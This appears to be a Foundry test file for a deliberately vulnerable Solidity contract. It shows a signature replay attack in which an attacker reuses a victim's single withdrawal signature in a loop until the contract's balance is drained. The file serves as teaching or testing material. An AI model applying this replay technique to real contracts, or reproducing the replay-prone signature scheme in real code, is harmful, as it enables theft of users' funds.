// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {SignatureReplay} from "../../src/signature-replay/SignatureReplay.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract SignatureReplayTest is Test {
    SignatureReplay public signatureReplay;
    bytes32 typehash;

    Account victim = makeAccount("victim");
    address attacker = makeAddr("attacker");

    uint256 startingAmount = 100 ether;
    uint256 withdrawAmount = 1 ether;

    function setUp() public {
        signatureReplay = new SignatureReplay();
        typehash = signatureReplay.TYPEHASH();
        vm.deal(victim.addr, startingAmount);
    }

    function test_signatureReplay() public {
        vm.startPrank(victim.addr);
        signatureReplay.deposit{value: startingAmount}();

        // These 3 lines happen off chain
        bytes32 structHash = keccak256(abi.encode(signatureReplay.TYPEHASH(), withdrawAmount));
        bytes32 digest = signatureReplay.getHashTypedDataV4(structHash); // This function will prepend the EIP-712 domain separator
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victim.key, digest);

        // Victim signs withdrawal of 1 ether, oh no! The signature is loose!
        // The V, R, and S values are live!
        signatureReplay.withdrawBySig(v, r, s, withdrawAmount);
        vm.stopPrank();

        assertEq(address(signatureReplay).balance, startingAmount - withdrawAmount);
        assertEq(signatureReplay.balances(victim.addr), startingAmount - withdrawAmount);

        vm.startPrank(attacker);
        while (address(signatureReplay).balance >= 1 ether) {
            signatureReplay.withdrawBySig(v, r, s, withdrawAmount);
        }
        vm.stopPrank();

        assertEq(address(signatureReplay).balance, 0);
        assertEq(signatureReplay.balances(victim.addr), 0);
    }
}
